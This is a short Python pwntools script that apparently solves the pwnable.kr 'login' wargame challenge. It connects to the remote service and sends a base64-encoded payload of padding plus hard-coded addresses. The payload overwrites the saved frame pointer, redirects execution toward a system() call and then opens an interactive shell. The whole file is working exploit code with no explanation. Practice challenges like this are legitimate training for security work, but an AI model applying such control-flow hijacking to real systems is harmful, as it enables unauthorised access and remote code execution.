from pwn import *

#io = process('./login')
io = remote('pwnable.kr','9003')
input_addr = 0x0811EB40
system_addr = 0x08049284

payload = 'a'*4+p32(system_addr)+p32(input_addr) # padding + system(main_eip) + main_ebp
payload = payload.encode('base64')
print payload

io.recvuntil('Authenticate : ')
io.sendline(payload)
io.interactive()
